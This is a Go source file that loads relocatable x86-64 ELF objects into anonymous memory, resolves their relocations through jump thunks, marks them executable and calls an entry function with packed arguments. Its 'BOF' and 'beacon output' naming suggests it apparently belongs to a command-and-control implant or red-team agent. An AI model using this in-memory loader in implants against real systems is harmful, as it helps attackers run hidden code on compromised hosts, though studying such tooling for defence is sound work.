//go:build !windows

package objload

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const (
	elfMagic = "\x7fELF"

	etRel    uint16 = 1
	emX86_64 uint16 = 62
	em386    uint16 = 3

	shtProgbits uint32 = 1
	shtSymtab   uint32 = 2
	shtStrtab   uint32 = 3
	shtRela     uint32 = 4
	shtNobits   uint32 = 8

	shfExecInstr uint64 = 0x4
	shfInfoLink  uint64 = 0x40
)

type elf64Ehdr struct {
	Ident     [16]byte
	Type      uint16
	Machine   uint16
	Version   uint32
	Entry     uint64
	Phoff     uint64
	Shoff     uint64
	Flags     uint32
	Ehsize    uint16
	Phentsize uint16
	Phnum     uint16
	Shentsize uint16
	Shnum     uint16
	Shstrndx  uint16
}

type elf64Shdr struct {
	Name      uint32
	Type      uint32
	Flags     uint64
	Addr      uint64
	Offset    uint64
	Size      uint64
	Link      uint32
	Info      uint32
	Addralign uint64
	Entsize   uint64
}

type elf64Sym struct {
	Name  uint32
	Info  uint8
	Other uint8
	Shndx uint16
	Value uint64
	Size  uint64
}

type elf64Rela struct {
	Offset uint64
	Info   uint64
	Addend int64
}

var thunkTemplate = []byte{0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0}

const (
	thunkSize       = 12
	thunkAddrOffset = 2
	maxThunks       = 255
)

type elfLoader struct {
	data        []byte
	header      elf64Ehdr
	sections    []elf64Shdr
	symbols     []elf64Sym
	stringTable []byte

	sectionMaps [][]byte
	sectionProt []int
	thunkTable  []byte
	thunkCount  int
}

func newElfLoader(data []byte) (*elfLoader, error) {
	if len(data) < 4 || string(data[:4]) != elfMagic {
		return nil, fmt.Errorf("not an ELF file")
	}

	l := &elfLoader{data: data}

	r := bytes.NewReader(data)
	if err := binary.Read(r, binary.LittleEndian, &l.header); err != nil {
		return nil, fmt.Errorf("failed to read ELF header: %w", err)
	}

	if l.header.Type != etRel {
		return nil, fmt.Errorf("not a relocatable ELF object (type=%d)", l.header.Type)
	}

	if runtime.GOARCH != "amd64" {
		return nil, fmt.Errorf("ELF BOF loading only supported on amd64, current arch: %s", runtime.GOARCH)
	}
	if l.header.Machine != emX86_64 {
		return nil, fmt.Errorf("ELF machine mismatch: expected x86_64 (%d), got %d", emX86_64, l.header.Machine)
	}

	l.sections = make([]elf64Shdr, l.header.Shnum)
	sr := bytes.NewReader(data[l.header.Shoff:])
	for i := range l.sections {
		if err := binary.Read(sr, binary.LittleEndian, &l.sections[i]); err != nil {
			return nil, fmt.Errorf("failed to read section header %d: %w", i, err)
		}
	}

	return l, nil
}

func (l *elfLoader) load() error {
	l.sectionMaps = make([][]byte, len(l.sections))
	l.sectionProt = make([]int, len(l.sections))

	var err error
	l.thunkTable, err = syscall.Mmap(-1, 0, maxThunks*thunkSize,
		syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_PRIVATE|syscall.MAP_ANON)
	if err != nil {
		return fmt.Errorf("failed to allocate thunk table: %w", err)
	}

	for i, sh := range l.sections {
		prot := syscall.PROT_READ | syscall.PROT_WRITE
		if sh.Flags&shfExecInstr != 0 {
			prot = syscall.PROT_READ | syscall.PROT_EXEC
		}
		l.sectionProt[i] = prot

		if sh.Size > 0 && (sh.Type == shtProgbits || sh.Type == shtNobits) {
			l.sectionMaps[i], err = syscall.Mmap(-1, 0, int(sh.Size),
				syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_PRIVATE|syscall.MAP_ANON)
			if err != nil {
				return fmt.Errorf("failed to map section %d: %w", i, err)
			}
			if sh.Type == shtProgbits {
				copy(l.sectionMaps[i], l.data[sh.Offset:sh.Offset+sh.Size])
			}
		}

		switch sh.Type {
		case shtSymtab:
			symSize := int(unsafe.Sizeof(elf64Sym{}))
			symCount := int(sh.Size) / symSize
			l.symbols = make([]elf64Sym, symCount)
			sr := bytes.NewReader(l.data[sh.Offset : sh.Offset+sh.Size])
			for j := range l.symbols {
				binary.Read(sr, binary.LittleEndian, &l.symbols[j])
			}
			strSect := l.sections[sh.Link]
			l.stringTable = l.data[strSect.Offset : strSect.Offset+strSect.Size]
		}
	}

	return nil
}

func (l *elfLoader) processRelocations() error {
	for _, sh := range l.sections {
		if sh.Type != shtRela {
			continue
		}

		targetIdx := int(sh.Info)
		if targetIdx >= len(l.sectionMaps) || l.sectionMaps[targetIdx] == nil {
			continue
		}

		relaSize := int(unsafe.Sizeof(elf64Rela{}))
		relaCount := int(sh.Size) / relaSize
		sr := bytes.NewReader(l.data[sh.Offset : sh.Offset+sh.Size])

		targetBase := uintptr(unsafe.Pointer(&l.sectionMaps[targetIdx][0]))

		for i := 0; i < relaCount; i++ {
			var rela elf64Rela
			if err := binary.Read(sr, binary.LittleEndian, &rela); err != nil {
				return fmt.Errorf("failed to read rela entry %d: %w", i, err)
			}

			symIdx := uint32(rela.Info >> 32)
			if int(symIdx) >= len(l.symbols) {
				return fmt.Errorf("relocation references invalid symbol index %d", symIdx)
			}
			sym := l.symbols[symIdx]
			symName := l.getSymbolName(sym.Name)

			patchAddr := targetBase + uintptr(rela.Offset)

			if sym.Shndx == 0 {
				symPtr := resolveSymbol(symName)
				if symPtr == nil {
					return fmt.Errorf("failed to resolve external symbol: %s", symName)
				}

				if l.thunkCount >= maxThunks {
					return fmt.Errorf("too many external symbols (max %d)", maxThunks)
				}
				thunkOff := l.thunkCount * thunkSize
				copy(l.thunkTable[thunkOff:], thunkTemplate)
				binary.LittleEndian.PutUint64(l.thunkTable[thunkOff+thunkAddrOffset:], uint64(uintptr(symPtr)))

				thunkAddr := uintptr(unsafe.Pointer(&l.thunkTable[thunkOff]))
				relOffset := int32(int64(thunkAddr) - int64(patchAddr) + rela.Addend)

				*(*int32)(unsafe.Pointer(patchAddr)) = relOffset
				l.thunkCount++
			} else if sh.Flags&shfInfoLink != 0 {
				if int(sym.Shndx) >= len(l.sectionMaps) || l.sectionMaps[sym.Shndx] == nil {
					return fmt.Errorf("symbol %s references unmapped section %d", symName, sym.Shndx)
				}
				symSectBase := uintptr(unsafe.Pointer(&l.sectionMaps[sym.Shndx][0]))
				relOffset := int32(int64(symSectBase) - int64(patchAddr) + rela.Addend + int64(sym.Value))

				*(*int32)(unsafe.Pointer(patchAddr)) = relOffset
			}
		}
	}

	return nil
}

func (l *elfLoader) setProtections() error {
	if err := syscall.Mprotect(l.thunkTable, syscall.PROT_READ|syscall.PROT_EXEC); err != nil {
		return fmt.Errorf("failed to mprotect thunk table: %w", err)
	}

	for i := range l.sections {
		if l.sectionMaps[i] == nil {
			continue
		}
		if err := syscall.Mprotect(l.sectionMaps[i], l.sectionProt[i]); err != nil {
			return fmt.Errorf("failed to mprotect section %d: %w", i, err)
		}
	}

	return nil
}

func (l *elfLoader) findFunction(name string) (unsafe.Pointer, error) {
	for _, sym := range l.symbols {
		symName := l.getSymbolName(sym.Name)
		if symName == name && sym.Shndx != 0 && int(sym.Shndx) < len(l.sectionMaps) {
			sect := l.sectionMaps[sym.Shndx]
			if sect == nil {
				return nil, fmt.Errorf("function %s in unmapped section %d", name, sym.Shndx)
			}
			ptr := unsafe.Pointer(uintptr(unsafe.Pointer(&sect[0])) + uintptr(sym.Value))
			return ptr, nil
		}
	}
	return nil, fmt.Errorf("function %s not found in ELF object", name)
}

func (l *elfLoader) getSymbolName(nameIdx uint32) string {
	if l.stringTable == nil || int(nameIdx) >= len(l.stringTable) {
		return ""
	}
	end := bytes.IndexByte(l.stringTable[nameIdx:], 0)
	if end < 0 {
		return string(l.stringTable[nameIdx:])
	}
	return string(l.stringTable[nameIdx : nameIdx+uint32(end)])
}

func (l *elfLoader) cleanup() {
	for i, m := range l.sectionMaps {
		if m != nil {
			syscall.Munmap(m)
			l.sectionMaps[i] = nil
		}
	}
	if l.thunkTable != nil {
		syscall.Munmap(l.thunkTable)
		l.thunkTable = nil
	}
}

func elfRunner(functionName string, elfData []byte, argData []byte) (string, error) {
	loader, err := newElfLoader(elfData)
	if err != nil {
		return "", err
	}
	defer loader.cleanup()

	if err := loader.load(); err != nil {
		return "", err
	}

	if err := loader.processRelocations(); err != nil {
		return "", err
	}

	if err := loader.setProtections(); err != nil {
		return "", err
	}

	funcPtr, err := loader.findFunction(functionName)
	if err != nil {
		return "", err
	}

	resetBeaconOutput()
	callBOFEntry(funcPtr, argData)
	output := getBeaconOutput()

	return output, nil
}

func executeObj(fileBytes []byte, mode string, args []string, entryPoint string) (string, error) {
	switch mode {
	case "bof":
		var argData []byte
		if len(args) > 0 {
			var err error
			argData, err = packBOFArgs(args)
			if err != nil {
				return "", fmt.Errorf("failed to pack BOF arguments: %s", err.Error())
			}
		}
		return elfRunner(entryPoint, fileBytes, argData)
	case "pe":
		return "", fmt.Errorf("PE execution is only supported on Windows")
	default:
		return "", fmt.Errorf("unsupported mode: %s (use 'bof')", mode)
	}
}

func packBOFArgs(args []string) ([]byte, error) {
	buf := new(bytes.Buffer)
	for _, arg := range args {
		parts := strings.SplitN(arg, ":", 2)
		if len(parts) != 2 {
			return nil, fmt.Errorf("invalid arg format: %s (expected type:value, e.g. z:hello)", arg)
		}
		switch parts[0] {
		case "z":
			s := parts[1]
			binary.Write(buf, binary.LittleEndian, uint32(len(s)+1))
			buf.WriteString(s)
			buf.WriteByte(0)
		case "Z":
			s := parts[1]
			wideBytes := utf16LEEncode(s)
			binary.Write(buf, binary.LittleEndian, uint32(len(wideBytes)+2))
			buf.Write(wideBytes)
			buf.Write([]byte{0, 0})
		case "i":
			val, err := strconv.ParseInt(parts[1], 0, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid int arg: %s", parts[1])
			}
			binary.Write(buf, binary.LittleEndian, int32(val))
		case "s":
			val, err := strconv.ParseInt(parts[1], 0, 16)
			if err != nil {
				return nil, fmt.Errorf("invalid short arg: %s", parts[1])
			}
			binary.Write(buf, binary.LittleEndian, int16(val))
		case "b":
			b, err := hex.DecodeString(parts[1])
			if err != nil {
				return nil, fmt.Errorf("invalid binary arg: %s", parts[1])
			}
			binary.Write(buf, binary.LittleEndian, uint32(len(b)))
			buf.Write(b)
		default:
			return nil, fmt.Errorf("unknown arg type: %s (valid: z, Z, i, s, b)", parts[0])
		}
	}

	result := new(bytes.Buffer)
	binary.Write(result, binary.LittleEndian, uint32(buf.Len()))
	result.Write(buf.Bytes())
	return result.Bytes(), nil
}

func utf16LEEncode(s string) []byte {
	var buf bytes.Buffer
	for _, r := range s {
		if r >= 0x10000 {
			r -= 0x10000
			high := 0xD800 + (r>>10)&0x3FF
			low := 0xDC00 + r&0x3FF
			binary.Write(&buf, binary.LittleEndian, uint16(high))
			binary.Write(&buf, binary.LittleEndian, uint16(low))
		} else {
			binary.Write(&buf, binary.LittleEndian, uint16(r))
		}
	}
	return buf.Bytes()
}
